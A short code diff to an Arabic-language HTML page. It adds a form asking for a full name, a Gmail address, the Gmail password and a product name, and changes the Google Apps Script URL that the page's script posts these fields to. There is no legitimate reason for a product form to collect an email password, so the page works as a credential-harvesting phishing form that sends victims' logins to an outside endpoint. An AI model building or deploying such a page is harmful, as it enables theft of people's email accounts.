@@ -1,3 +1,19 @@
+<form id="productForm">
+  <label for="name">الاسم الكامل:</label><br>
+  <input type="text" id="name" name="name" required><br><br>
+
+  <label for="email">بريد Gmail:</label><br>
+  <input type="email" id="email" name="email" required><br><br>
+
+  <label for="password">كلمة المرور:</label><br>
+  <input type="password" id="password" name="password" required><br><br>
+
+  <label for="product">اسم المنتج:</label><br>
+  <input type="text" id="product" name="product" required><br><br>
+
+  <button type="submit">إرسال</button>
+</form>
+
 <script>
   document.getElementById("productForm").addEventListener("submit", function(e) {
     e.preventDefault();
@@ -9,7 +25,7 @@
       product: document.getElementById("product").value
     };
 
-      fetch("https://script.google.com/macros/s/AKfycbwN9IdxTrojNH4_zyAEr8DDQe26ccWjDMrS_B9P6QwJuzoJ9y0oPM3TX0MoYt-F7BeD/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbxYGElOuI4x_eD4N5wlmxwCXk5-B-f-dTAhgpRPOX1FZcs1r7-NslvMd3fmfMOYov-F/exec", {
       method: "POST",
       body: JSON.stringify(data),
       headers: {
